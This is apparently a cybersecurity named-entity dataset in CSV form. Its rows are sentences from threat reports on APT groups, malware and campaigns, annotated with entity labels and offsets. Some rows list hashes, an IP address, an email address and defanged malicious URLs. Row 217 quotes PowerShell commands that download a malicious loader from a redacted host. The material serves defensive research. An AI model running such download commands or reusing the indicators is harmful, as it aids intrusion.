,id,text,entities
182,1687,"While the SunOrcal malware family has been confirmed to have been active since 2013, possibly even earlier, this new variant has been observed targeting regions outside of the typical target radius for this threat group, now expanding to include Vietnam and Myanmar.","[{'end_offset': 18, 'id': 5005, 'label': 'malware', 'start_offset': 10}, {'end_offset': 83, 'id': 46877, 'label': 'TIME', 'start_offset': 79}, {'end_offset': 253, 'id': 46878, 'label': 'location', 'start_offset': 246}, {'end_offset': 265, 'id': 46879, 'label': 'location', 'start_offset': 258}]"
183,837," While kernel APC attacks aren’t well known and can be hard to understand, their proven success in WanaCrypt0r/WannaCry and the Petya/NotPetya make them an important threat to understand because proven attack techniques are quickly adopted widely.","[{'end_offset': 133, 'id': 2746, 'label': 'malware', 'start_offset': 128}, {'end_offset': 25, 'id': 44880, 'label': 'attack-pattern', 'start_offset': 7}, {'end_offset': 110, 'id': 44881, 'label': 'malware', 'start_offset': 99}, {'end_offset': 119, 'id': 44882, 'label': 'malware', 'start_offset': 111}, {'end_offset': 142, 'id': 44884, 'label': 'malware', 'start_offset': 134}]"
184,4473,"Reporting by CitizenLab linked this activity to Candiru, an Israeli spyware vendor.","[{'end_offset': 23, 'id': 50267, 'label': 'identity', 'start_offset': 13}, {'end_offset': 55, 'id': 50268, 'label': 'threat-actor', 'start_offset': 48}, {'end_offset': 67, 'id': 50269, 'label': 'location', 'start_offset': 60}]"
185,3340,It is well known that the Winnti Group has previously used stolen certificates from game studios to sign its malware.,"[{'end_offset': 78, 'id': 48950, 'label': 'attack-pattern', 'start_offset': 59}, {'end_offset': 38, 'id': 48949, 'label': 'threat-actor', 'start_offset': 26}]"
186,5037,"Recently observed Ghostwriter credential phishing domains and emails: Curious Gorge, a group TAG attributes to China's PLA SSF, has remained active against government, military, logistics and manufacturing organizations in Ukraine, Russia and Central Asia.","[{'end_offset': 238, 'id': 51116, 'label': 'location', 'start_offset': 232}, {'end_offset': 255, 'id': 51117, 'label': 'location', 'start_offset': 243}, {'end_offset': 96, 'id': 51113, 'label': 'identity', 'start_offset': 93}, {'end_offset': 230, 'id': 51115, 'label': 'location', 'start_offset': 223}, {'end_offset': 83, 'id': 51112, 'label': 'threat-actor', 'start_offset': 70}, {'end_offset': 29, 'id': 51111, 'label': 'threat-actor', 'start_offset': 18}, {'end_offset': 126, 'id': 51114, 'label': 'identity', 'start_offset': 111}]"
187,5030,"Recently observed COLDRIVER credential phishing domains: Ghostwriter, a Belarusian threat actor, has remained active during the course of the war and recently resumed targeting of Gmail accounts via credential phishing.","[{'end_offset': 27, 'id': 51098, 'label': 'threat-actor', 'start_offset': 18}, {'end_offset': 82, 'id': 51100, 'label': 'location', 'start_offset': 72}, {'end_offset': 185, 'id': 51101, 'label': 'SOFTWARE', 'start_offset': 180}, {'end_offset': 218, 'id': 51102, 'label': 'attack-pattern', 'start_offset': 199}, {'end_offset': 68, 'id': 51099, 'label': 'threat-actor', 'start_offset': 57}]"
188,14303,Content of README.txt register.bat is used to gain administrator privilege.,"[{'end_offset': 21, 'id': 48516, 'label': 'FILEPATH', 'start_offset': 11}, {'end_offset': 34, 'id': 48518, 'label': 'FILEPATH', 'start_offset': 22}, {'end_offset': 74, 'id': 48519, 'label': 'attack-pattern', 'start_offset': 51}]"
189,1789,"Infection chain      Figure 1. AvosLocker infection chain      According to our analysis, the suspected entry point is via the Zoho ManageEngine ADSelfService Plus (ADSS) exploit:      Figure 2.","[{'end_offset': 41, 'id': 5293, 'label': 'malware', 'start_offset': 31}, {'end_offset': 178, 'id': 46920, 'label': 'vulnerability', 'start_offset': 127}]"
190,3617,"In our new research blog “FreeMilk: A Highly Targeted Spear Phishing Campaign”, our Unit 42 research team has discovered an attack campaign that takes spear phishing targeting to the next level by hijacking in-progress email conversations.","[{'end_offset': 105, 'id': 49399, 'label': 'identity', 'start_offset': 84}, {'end_offset': 165, 'id': 49400, 'label': 'attack-pattern', 'start_offset': 151}, {'end_offset': 238, 'id': 49401, 'label': 'attack-pattern', 'start_offset': 197}, {'end_offset': 139, 'id': 49402, 'label': 'campaign', 'start_offset': 131}]"
191,13641,The recent campaigns target senior positions in the United States and Canada.,"[{'end_offset': 44, 'id': 51729, 'label': 'identity', 'start_offset': 28}, {'end_offset': 76, 'id': 51731, 'label': 'location', 'start_offset': 70}, {'end_offset': 20, 'id': 51728, 'label': 'campaign', 'start_offset': 4}, {'end_offset': 65, 'id': 51730, 'label': 'location', 'start_offset': 52}]"
192,13632,The code used to obtain user QQ numbers     Protecting e-commerce platforms from Water Pamola’s attacks Water Pamola attacked online merchants with an XSS script appended onto online shopping orders.,"[{'end_offset': 93, 'id': 51716, 'label': 'campaign', 'start_offset': 81}, {'end_offset': 116, 'id': 51717, 'label': 'campaign', 'start_offset': 104}, {'end_offset': 142, 'id': 51718, 'label': 'identity', 'start_offset': 126}, {'end_offset': 154, 'id': 51719, 'label': 'attack-pattern', 'start_offset': 151}]"
193,4266,"The other file stealer (1f0dabd61947b6df8a392b77a0eae33777be3caad13698aecc223b54ab4b859a, Detected as TROJ_DELF.XXWZ) is related to a domain reported in September 2016.","[{'end_offset': 116, 'id': 50069, 'label': 'malware', 'start_offset': 102}, {'end_offset': 167, 'id': 50070, 'label': 'TIME', 'start_offset': 153}, {'end_offset': 88, 'id': 50068, 'label': 'hash', 'start_offset': 24}]"
194,13960,"In a US Senate hearing on cybersecurity threats, Senator Rob Portman of Ohio described the strike on Colonial Pipeline as “potentially the most substantial and damaging attack on US critical infrastructure ever.”","[{'end_offset': 68, 'id': 48769, 'label': 'identity', 'start_offset': 49}, {'end_offset': 14, 'id': 48768, 'label': 'identity', 'start_offset': 5}, {'end_offset': 77, 'id': 48770, 'label': 'location', 'start_offset': 72}, {'end_offset': 182, 'id': 48771, 'label': 'location', 'start_offset': 179}]"
195,3697,"Carbanak also performs techniques for disabling security tools, deleting files that are left in malicious activity, and modifying registry to hide configuration information.","[{'end_offset': 138, 'id': 49494, 'label': 'attack-pattern', 'start_offset': 120}, {'end_offset': 78, 'id': 49493, 'label': 'attack-pattern', 'start_offset': 64}, {'end_offset': 62, 'id': 49491, 'label': 'attack-pattern', 'start_offset': 38}, {'end_offset': 8, 'id': 49492, 'label': 'threat-actor', 'start_offset': 0}]"
196,4286,"The group still uses the Badnews malware, a backdoor with information-stealing and file-executing capabilities, albeit updated with a slight modification in the encryption routine at the end of 2017, when they added Blowfish encryption on top of their custom encryption described in our former Patchwork blogpost.","[{'end_offset': 40, 'id': 50084, 'label': 'malware', 'start_offset': 25}, {'end_offset': 78, 'id': 50085, 'label': 'attack-pattern', 'start_offset': 58}, {'end_offset': 97, 'id': 50086, 'label': 'attack-pattern', 'start_offset': 83}, {'end_offset': 198, 'id': 50087, 'label': 'TIME', 'start_offset': 187}, {'end_offset': 303, 'id': 50088, 'label': 'threat-actor', 'start_offset': 294}]"
197,5108,"&amp;nbsp; [Lightly edited transcript of the video above] Hi there, Mark Nunnikhoven from Trend Micro Research, I want to talk to you about the concept of lateral movement.","[{'end_offset': 171, 'id': 51211, 'label': 'attack-pattern', 'start_offset': 155}, {'end_offset': 84, 'id': 51209, 'label': 'identity', 'start_offset': 68}, {'end_offset': 110, 'id': 51210, 'label': 'identity', 'start_offset': 90}]"
198,4204,"Back in February, we noted the similarities between the Patchwork and Confucius groups and found that, in addition to the similarities in their malware code, both groups primarily went after targets in South Asia.","[{'end_offset': 79, 'id': 50016, 'label': 'threat-actor', 'start_offset': 70}, {'end_offset': 16, 'id': 50014, 'label': 'TIME', 'start_offset': 8}, {'end_offset': 65, 'id': 50015, 'label': 'threat-actor', 'start_offset': 56}, {'end_offset': 212, 'id': 50017, 'label': 'location', 'start_offset': 202}]"
199,3398,BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  75e03f40a088903579a436c0d8e8bc3d0d71cf2942ad793cc948f36866a2e1ad  silverlight_ins.exe  ,"[{'end_offset': 11, 'id': 10259, 'label': 'malware', 'start_offset': 0}, {'end_offset': 44, 'id': 49060, 'label': 'malware', 'start_offset': 20}, {'end_offset': 110, 'id': 10260, 'label': 'hash', 'start_offset': 46}, {'end_offset': 131, 'id': 49061, 'label': 'FILEPATH', 'start_offset': 112}]"
200,1542,"The Sofacy Group (AKA APT28, Grizzly Steppe, Fancy Bear, STRONTIUM, Sednit, Tsar Team, Pawn Storm) is a well-known hacking organization widely reported to be associated with Russia by the US Intelligence Community, numerous media reports and other cybersecurity companies.","[{'end_offset': 16, 'id': 45045, 'label': 'threat-actor', 'start_offset': 4}, {'end_offset': 27, 'id': 45046, 'label': 'threat-actor', 'start_offset': 22}, {'end_offset': 85, 'id': 45051, 'label': 'threat-actor', 'start_offset': 76}, {'end_offset': 97, 'id': 45052, 'label': 'threat-actor', 'start_offset': 87}, {'end_offset': 180, 'id': 45053, 'label': 'location', 'start_offset': 174}, {'end_offset': 213, 'id': 45054, 'label': 'identity', 'start_offset': 188}, {'end_offset': 43, 'id': 45047, 'label': 'threat-actor', 'start_offset': 29}, {'end_offset': 55, 'id': 45048, 'label': 'threat-actor', 'start_offset': 45}, {'end_offset': 66, 'id': 45049, 'label': 'threat-actor', 'start_offset': 57}, {'end_offset': 74, 'id': 45050, 'label': 'threat-actor', 'start_offset': 68}]"
201,207,"On Feb. 23, a malicious file named conhosts._exe (SHA256: 1bc44eef75779e3ca1eefb8ff5a64807dbc942b1e4a2672d77b9f6928d292591) was uploaded to a public malware repository from an organization in Kyiv, Ukraine.","[{'end_offset': 122, 'id': 678, 'label': 'hash', 'start_offset': 58}, {'end_offset': 205, 'id': 44630, 'label': 'location', 'start_offset': 192}, {'end_offset': 48, 'id': 44631, 'label': 'FILEPATH', 'start_offset': 35}, {'end_offset': 10, 'id': 44632, 'label': 'TIME', 'start_offset': 3}]"
202,4205,"During the months that followed in which we tracked Confucius’ activities, we found that they were still aiming for Pakistani targets.","[{'end_offset': 125, 'id': 50019, 'label': 'location', 'start_offset': 116}, {'end_offset': 61, 'id': 50018, 'label': 'threat-actor', 'start_offset': 52}]"
203,684,"While still not seen in the wild, similar exploits in Microsoft Equation Editor, such as such as CVE-2018-0807 and CVE-2018-0798, were identified by Unit 42 researchers.","[{'end_offset': 156, 'id': 2275, 'label': 'identity', 'start_offset': 149}, {'end_offset': 79, 'id': 44827, 'label': 'SOFTWARE', 'start_offset': 54}, {'end_offset': 110, 'id': 44824, 'label': 'vulnerability', 'start_offset': 97}, {'end_offset': 128, 'id': 44825, 'label': 'vulnerability', 'start_offset': 115}]"
204,2386,"It has many of the same capabilities as another backdoor, Crosswalk, which has also been used by Earth Baku.","[{'end_offset': 107, 'id': 47451, 'label': 'threat-actor', 'start_offset': 97}, {'end_offset': 67, 'id': 47450, 'label': 'malware', 'start_offset': 58}]"
205,3397,BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  6ee8f6a0c514a5bd25f7a32210f4b3fe878d9d417a7ebe07befc285131bae10e  news.exe,"[{'end_offset': 110, 'id': 10258, 'label': 'hash', 'start_offset': 46}, {'end_offset': 11, 'id': 10257, 'label': 'malware', 'start_offset': 0}, {'end_offset': 120, 'id': 49059, 'label': 'FILEPATH', 'start_offset': 112}, {'end_offset': 44, 'id': 49058, 'label': 'malware', 'start_offset': 20}]"
206,3479,Encrypted configurations of Protux (top) and Marade (bottom) in the same blog post Correlating Marade and Protux,"[{'end_offset': 34, 'id': 49281, 'label': 'malware', 'start_offset': 28}, {'end_offset': 51, 'id': 49282, 'label': 'malware', 'start_offset': 45}, {'end_offset': 101, 'id': 49283, 'label': 'malware', 'start_offset': 95}, {'end_offset': 112, 'id': 49284, 'label': 'malware', 'start_offset': 106}]"
207,3713,"In Carbanak attacks, the groups’ attacks can involve logging into services that accept remote connections and using stolen password hashes through the “pass the hash” method.","[{'end_offset': 165, 'id': 49509, 'label': 'attack-pattern', 'start_offset': 152}, {'end_offset': 11, 'id': 49510, 'label': 'threat-actor', 'start_offset': 3}, {'end_offset': 138, 'id': 49511, 'label': 'attack-pattern', 'start_offset': 110}]"
208,3670,"To be more specific in terms of ATT&CK® techniques, Carbanak and FIN7 share a notable number of similarities.","[{'end_offset': 69, 'id': 49461, 'label': 'threat-actor', 'start_offset': 65}, {'end_offset': 60, 'id': 49460, 'label': 'threat-actor', 'start_offset': 52}]"
209,4558,"During our investigation into the Turla CyberAzov apps, we identified another Android app first seen in the wild in March 2022 that also claimed to conduct DoS attacks against Russian websites.","[{'end_offset': 126, 'id': 50370, 'label': 'TIME', 'start_offset': 116}, {'end_offset': 54, 'id': 50368, 'label': 'malware', 'start_offset': 34}, {'end_offset': 85, 'id': 50369, 'label': 'SOFTWARE', 'start_offset': 78}, {'end_offset': 159, 'id': 50371, 'label': 'attack-pattern', 'start_offset': 156}, {'end_offset': 183, 'id': 50372, 'label': 'location', 'start_offset': 176}]"
210,5066,Recently observed Ghostwriter credential phishing domains:,"[{'end_offset': 29, 'id': 51172, 'label': 'threat-actor', 'start_offset': 18}, {'end_offset': 49, 'id': 51173, 'label': 'attack-pattern', 'start_offset': 30}]"
211,3178,"Furthermore, BIOPASS RAT also creates scheduled tasks to load the Cobalt Strike shellcode during the initialization, indicating that the malicious actor behind the attack still heavily relies on Cobalt Strike.","[{'end_offset': 24, 'id': 48304, 'label': 'malware', 'start_offset': 13}, {'end_offset': 79, 'id': 48305, 'label': 'tools', 'start_offset': 66}, {'end_offset': 208, 'id': 48306, 'label': 'tools', 'start_offset': 195}]"
212,3180,"In this blog entry, we will dive deeper into BIOPASS RAT with a detailed technical analysis of the infection chain, the different components of the malware, and any possible associations with Winnti.","[{'end_offset': 198, 'id': 48309, 'label': 'threat-actor', 'start_offset': 192}, {'end_offset': 56, 'id': 48310, 'label': 'malware', 'start_offset': 45}]"
213,2370,"Earth Baku deploys its ongoing campaign, which can be traced to as far back as July 2020, through multiple attack vectors that are designed based on different exploits or the infrastructure of its targeted victim's environment:  • SQL injection to upload a malicious file • Installment through InstallUtil.exe in a scheduled task • Possibly a malicious link (LNK) file sent as an email attachment • Exploitation of the ProxyLogon vulnerability CVE-2021-26855 to upload a China Chopper web shell  This campaign uses previously unidentified shellcode loaders, which we have named StealthVector and StealthMutant, and a backdoor, which we have dubbed ScrambleCross.","[{'end_offset': 10, 'id': 45480, 'label': 'threat-actor', 'start_offset': 0}, {'end_offset': 458, 'id': 45472, 'label': 'vulnerability', 'start_offset': 444}, {'end_offset': 591, 'id': 45474, 'label': 'malware', 'start_offset': 578}, {'end_offset': 609, 'id': 45475, 'label': 'malware', 'start_offset': 596}, {'end_offset': 661, 'id': 45476, 'label': 'malware', 'start_offset': 648}, {'end_offset': 88, 'id': 45477, 'label': 'TIME', 'start_offset': 79}, {'end_offset': 309, 'id': 45478, 'label': 'FILEPATH', 'start_offset': 294}, {'end_offset': 429, 'id': 45479, 'label': 'vulnerability', 'start_offset': 419}, {'end_offset': 244, 'id': 7033, 'label': 'attack-pattern', 'start_offset': 231}, {'end_offset': 329, 'id': 7034, 'label': 'attack-pattern', 'start_offset': 315}, {'end_offset': 484, 'id': 7036, 'label': 'malware', 'start_offset': 471}]"
214,3383,BIOPASS RAT Loader  Backdoor.Win32.BIOPASS.A  30d9ffd4b92a4ed67569a78ceb25bb6f66346d1c0a7d6d6305e235cbdfe61ebe  Silverlight_ins.exe  ,"[{'end_offset': 11, 'id': 10230, 'label': 'malware', 'start_offset': 0}, {'end_offset': 110, 'id': 10231, 'label': 'hash', 'start_offset': 46}, {'end_offset': 131, 'id': 49034, 'label': 'FILEPATH', 'start_offset': 112}, {'end_offset': 44, 'id': 49033, 'label': 'malware', 'start_offset': 20}]"
215,4566,"The Sandworm campaign used compromised government accounts to send links to Microsoft Office documents hosted on compromised domains, primarily targeting media organizations in Ukraine.","[{'end_offset': 21, 'id': 50395, 'label': 'campaign', 'start_offset': 4}, {'end_offset': 58, 'id': 50396, 'label': 'attack-pattern', 'start_offset': 27}, {'end_offset': 92, 'id': 50397, 'label': 'SOFTWARE', 'start_offset': 76}, {'end_offset': 184, 'id': 50398, 'label': 'location', 'start_offset': 177}]"
216,13543,"Instead, malicious scripts are being executed when the administrators look into customer orders in their online shop’s administration panel.","[{'end_offset': 69, 'id': 51614, 'label': 'identity', 'start_offset': 55}, {'end_offset': 139, 'id': 51615, 'label': 'SOFTWARE', 'start_offset': 105}, {'end_offset': 26, 'id': 51616, 'label': 'malware', 'start_offset': 9}]"
217,4037,"After the threat actors get access to the vulnerable hosts by using ProxyLogon exploits and web shells, they use bitsadmin to download the next-stage loader (loaders are detected as Nerapack) as well as its payload file (.bin). C:\Windows\system32\windowspowershell\v1.0\powershell.exe -Command ""&{Import-Module BitsTransfer; Start-BitsTransfer 'http://<redacted>:8000/dfmanager.exe' ""%temp%/dfmanager.exe""}"" C:\Windows\system32\windowspowershell\v1.0\powershell.exe -Command ""&{Import-Module BitsTransfer; Start-BitsTransfer 'http://<redacted>:8000/dfmanager.bin' ""C:\Users\<redacted>\AppData\Local\Temp/dfmanager.bin""}""","[{'end_offset': 102, 'id': 49882, 'label': 'attack-pattern', 'start_offset': 92}, {'end_offset': 405, 'id': 49888, 'label': 'FILEPATH', 'start_offset': 385}, {'end_offset': 618, 'id': 49891, 'label': 'URL', 'start_offset': 566}, {'end_offset': 466, 'id': 49889, 'label': 'FILEPATH', 'start_offset': 409}, {'end_offset': 122, 'id': 49883, 'label': 'tools', 'start_offset': 113}, {'end_offset': 190, 'id': 49884, 'label': 'malware', 'start_offset': 182}, {'end_offset': 23, 'id': 49885, 'label': 'threat-actor', 'start_offset': 10}, {'end_offset': 285, 'id': 49886, 'label': 'FILEPATH', 'start_offset': 228}, {'end_offset': 382, 'id': 49887, 'label': 'URL', 'start_offset': 346}, {'end_offset': 87, 'id': 49881, 'label': 'vulnerability', 'start_offset': 68}, {'end_offset': 563, 'id': 49890, 'label': 'URL', 'start_offset': 527}]"
218,1903,"As with Bahamut applications, once downloaded and executed, it showed multiple malicious features that deal with stealing information.","[{'end_offset': 133, 'id': 47030, 'label': 'attack-pattern', 'start_offset': 113}, {'end_offset': 15, 'id': 47029, 'label': 'threat-actor', 'start_offset': 8}]"
219,1404,"Kuluoz makes money for its owner by installing other malware, such as crimeware or fake antivirus programs.","[{'end_offset': 6, 'id': 45008, 'label': 'malware', 'start_offset': 0}, {'end_offset': 79, 'id': 45009, 'label': 'attack-pattern', 'start_offset': 70}, {'end_offset': 106, 'id': 45010, 'label': 'attack-pattern', 'start_offset': 83}]"
220,1811,     Figure 9. The PowerShell downloading and installing AnyDeskMSI     ,"[{'end_offset': 29, 'id': 5340, 'label': 'tools', 'start_offset': 19}, {'end_offset': 67, 'id': 46932, 'label': 'tools', 'start_offset': 57}]"
221,1392," Palo Alto Networks customers receive protections against the OctoberCMS vulnerability in the following ways:  Palo Alto Networks customers receive protections against WhisperGate malware in the following ways:  The Cortex XSOAR ""WhisperGate & CVE-2021-32648'' pack can help automatically detect and mitigate the two threats.","[{'end_offset': 19, 'id': 44991, 'label': 'identity', 'start_offset': 1}, {'end_offset': 228, 'id': 44996, 'label': 'SOFTWARE', 'start_offset': 216}, {'end_offset': 258, 'id': 44998, 'label': 'vulnerability', 'start_offset': 244}, {'end_offset': 129, 'id': 44993, 'label': 'identity', 'start_offset': 111}, {'end_offset': 86, 'id': 44994, 'label': 'vulnerability', 'start_offset': 62}, {'end_offset': 179, 'id': 44995, 'label': 'malware', 'start_offset': 168}, {'end_offset': 241, 'id': 4172, 'label': 'malware', 'start_offset': 230}]"
222,5416,Asus is likely only one of the vendors that is currently being targeted by Cyclops Blink.,"[{'end_offset': 4, 'id': 51420, 'label': 'identity', 'start_offset': 0}, {'end_offset': 88, 'id': 51421, 'label': 'malware', 'start_offset': 75}]"
223,803,"Stolen credentials underpin some of the most critical and damaging attacks out there; both Shamoon 2 and the Sofacy threat actor group, for example, have made detailed use of credential theft.","[{'end_offset': 191, 'id': 46358, 'label': 'attack-pattern', 'start_offset': 175}, {'end_offset': 134, 'id': 46356, 'label': 'threat-actor', 'start_offset': 109}, {'end_offset': 100, 'id': 46357, 'label': 'threat-actor', 'start_offset': 91}]"
224,2596,"This was followed in short order by attacks on South American telecoms providers Claro and Embratel, Brazilian state-owned postal service “Correios,” and Portuguese media giant Impresa.","[{'end_offset': 110, 'id': 47784, 'label': 'location', 'start_offset': 101}, {'end_offset': 147, 'id': 47785, 'label': 'identity', 'start_offset': 139}, {'end_offset': 164, 'id': 47786, 'label': 'location', 'start_offset': 154}, {'end_offset': 61, 'id': 47781, 'label': 'location', 'start_offset': 47}, {'end_offset': 99, 'id': 47783, 'label': 'identity', 'start_offset': 91}, {'end_offset': 184, 'id': 47787, 'label': 'identity', 'start_offset': 176}, {'end_offset': 86, 'id': 47782, 'label': 'identity', 'start_offset': 81}]"
225,14301,"Content of the MiaKhalifa.rar file README.txt provides instructions teaching the user how to turn off the anti-virus software and how to turn on the network, which the attacker needs to steal and upload data to its C&C server.","[{'end_offset': 29, 'id': 48512, 'label': 'FILEPATH', 'start_offset': 15}, {'end_offset': 125, 'id': 48515, 'label': 'SOFTWARE', 'start_offset': 106}, {'end_offset': 45, 'id': 48513, 'label': 'FILEPATH', 'start_offset': 34}, {'end_offset': 225, 'id': 48514, 'label': 'Infrastucture', 'start_offset': 215}]"
226,4800,"Many Russian government cyber assets have remained focused on Ukraine and related issues since the invasion began, while Russian APT activity outside of Ukraine largely remains the same.","[{'end_offset': 69, 'id': 50702, 'label': 'location', 'start_offset': 62}, {'end_offset': 132, 'id': 50703, 'label': 'threat-actor', 'start_offset': 121}, {'end_offset': 160, 'id': 50704, 'label': 'location', 'start_offset': 153}, {'end_offset': 36, 'id': 50701, 'label': 'threat-actor', 'start_offset': 5}]"
227,4165,"Based on these special mutex strings, we believe the threat actors come from a Chinese-speaking region.","[{'end_offset': 66, 'id': 49970, 'label': 'threat-actor', 'start_offset': 53}, {'end_offset': 102, 'id': 49971, 'label': 'location', 'start_offset': 79}]"
228,2381,"After its payload is decrypted, StealthMutant performs process hollowing to execute its payload in a remote process.","[{'end_offset': 72, 'id': 7081, 'label': 'attack-pattern', 'start_offset': 55}, {'end_offset': 45, 'id': 47444, 'label': 'malware', 'start_offset': 32}]"
229,13149,We found that Tropic Trooper’s latest activities center on targeting Taiwanese and the Philippine military’s physically isolated networks through a USBferry attack (the name derived from a sample found in a related research).,"[{'end_offset': 28, 'id': 48927, 'label': 'threat-actor', 'start_offset': 14}, {'end_offset': 79, 'id': 48928, 'label': 'location', 'start_offset': 69}, {'end_offset': 98, 'id': 48929, 'label': 'location', 'start_offset': 87}, {'end_offset': 109, 'id': 48931, 'label': 'identity', 'start_offset': 98}, {'end_offset': 163, 'id': 48930, 'label': 'malware', 'start_offset': 148}]"
230,3403, 8b5d4840bbdce0798950cd5584e3d4564581a7698bc6cfb2892c97b826129cec  Silverlight_ins.exe,"[{'end_offset': 65, 'id': 10270, 'label': 'hash', 'start_offset': 1}, {'end_offset': 86, 'id': 49071, 'label': 'FILEPATH', 'start_offset': 67}]"
231,3545,"Blackgear’s campaigns also use email as an entry point, which is why it’s important to secure the email gateway.","[{'end_offset': 9, 'id': 49322, 'label': 'threat-actor', 'start_offset': 0}, {'end_offset': 54, 'id': 49323, 'label': 'attack-pattern', 'start_offset': 27}]"
232,13588,"The blog post describes a web shell with two components — a PHP script and an HTML uploading file — however,  the second one is not needed as the proper POST request can be created with any custom or third-party tool (e.g., Fiddler).      Figure 6.","[{'end_offset': 35, 'id': 51676, 'label': 'tools', 'start_offset': 26}, {'end_offset': 71, 'id': 51677, 'label': 'tools', 'start_offset': 60}, {'end_offset': 97, 'id': 51678, 'label': 'tools', 'start_offset': 78}]"
233,13561,"As previously mentioned, Water Pamola sent online shopping orders appended with a malicious XSS script to attack e-commerce administrators.","[{'end_offset': 37, 'id': 51638, 'label': 'campaign', 'start_offset': 25}, {'end_offset': 95, 'id': 51639, 'label': 'attack-pattern', 'start_offset': 92}, {'end_offset': 138, 'id': 51640, 'label': 'identity', 'start_offset': 113}]"
234,3422, Backdoor.Win64.BIOPASS.A  e52ea54cfe3afd93a53e368245c5630425e326291bf1b2599b75dbf8e75b7aeb  flashplayer_install_cn.exe  BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  f1ad25b594a855a3c9af75c5da74b44d900f6fbb655033f9a98a956292011c8e  Silverlight.exe,"[{'end_offset': 132, 'id': 10311, 'label': 'malware', 'start_offset': 121}, {'end_offset': 91, 'id': 10310, 'label': 'hash', 'start_offset': 27}, {'end_offset': 231, 'id': 10312, 'label': 'hash', 'start_offset': 167}, {'end_offset': 25, 'id': 49110, 'label': 'malware', 'start_offset': 1}, {'end_offset': 165, 'id': 49111, 'label': 'malware', 'start_offset': 141}, {'end_offset': 119, 'id': 49112, 'label': 'FILEPATH', 'start_offset': 93}, {'end_offset': 248, 'id': 49113, 'label': 'FILEPATH', 'start_offset': 233}]"
235,336," All of the domains currently resolve to 151.248.115.146, a Russian IP address and have WhoIs records associated with the e-mail address “ladomfichisi1987@mail.ru”.","[{'end_offset': 56, 'id': 1156, 'label': 'IPV4', 'start_offset': 41}, {'end_offset': 67, 'id': 46025, 'label': 'location', 'start_offset': 60}, {'end_offset': 162, 'id': 44703, 'label': 'EMAIL', 'start_offset': 138}]"
236,600," The attackers behind Hancitor aren’t the first to time their spam attacks like this, but it is an effective tactic to try and increase their chances of success, especially when combined with the other innovation that we’ve seen.","[{'end_offset': 30, 'id': 44791, 'label': 'malware', 'start_offset': 22}, {'end_offset': 74, 'id': 44792, 'label': 'attack-pattern', 'start_offset': 62}]"
237,2555, Credential theft has been known to be a key part of the Shamoon 2 attacks.,"[{'end_offset': 17, 'id': 47749, 'label': 'attack-pattern', 'start_offset': 1}, {'end_offset': 66, 'id': 47750, 'label': 'threat-actor', 'start_offset': 57}]"
238,14299,"In the case of the Windows variant (WORM_INFOKEY.A) of Maikspy last seen in April 2017, the user will be tricked into downloading a MiaKhalifa.rar file, which contains the files seen in the screenshot below:","[{'end_offset': 86, 'id': 48510, 'label': 'TIME', 'start_offset': 76}, {'end_offset': 27, 'id': 48507, 'label': 'SOFTWARE', 'start_offset': 19}, {'end_offset': 50, 'id': 48508, 'label': 'malware', 'start_offset': 36}, {'end_offset': 63, 'id': 48509, 'label': 'malware', 'start_offset': 55}, {'end_offset': 152, 'id': 48511, 'label': 'FILEPATH', 'start_offset': 132}]"
239,2682,"LockBit 2.0 operators also released an information-stealer dubbed StealBit, which was developed to support affiliates of the LockBit 2.0 RaaS when exfiltrating data from breached companies.","[{'end_offset': 74, 'id': 45655, 'label': 'malware', 'start_offset': 66}, {'end_offset': 11, 'id': 45654, 'label': 'threat-actor', 'start_offset': 0}, {'end_offset': 136, 'id': 45656, 'label': 'threat-actor', 'start_offset': 125}]"
240,14337,"Based on these findings, it’s possible that the attackers behind Maikspy operate //www[.]roundyearfun[.]org/ and hxxp://miakhalifagame[.]com/.","[{'end_offset': 73, 'id': 48565, 'label': 'malware', 'start_offset': 65}, {'end_offset': 141, 'id': 48568, 'label': 'URL', 'start_offset': 113}, {'end_offset': 108, 'id': 48566, 'label': 'URL', 'start_offset': 83}]"
